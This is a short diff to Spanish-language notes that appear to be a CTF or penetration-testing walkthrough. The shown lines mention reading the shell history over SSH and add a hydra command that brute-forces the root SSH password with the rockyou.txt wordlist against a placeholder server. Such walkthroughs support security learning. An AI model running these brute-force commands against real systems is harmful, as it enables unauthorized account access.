@@ -23,5 +23,7 @@
 ++ En esta ocasión no nos aparecen exploits, probaremos con otro método
 ++ Volvemos a la terminal con la sesion ssh abierta
 ++ cat .ash_history (Nos permite ver el historial de comandos ejecutados)
+++ No nos aparece información útil, trataremos con otro método
+++ hydra -l root -P rockyou.txt ssh://<ip_servidor> (Ataque de fuerza bruta para intentar descubrir la contraseña de root)
 
 
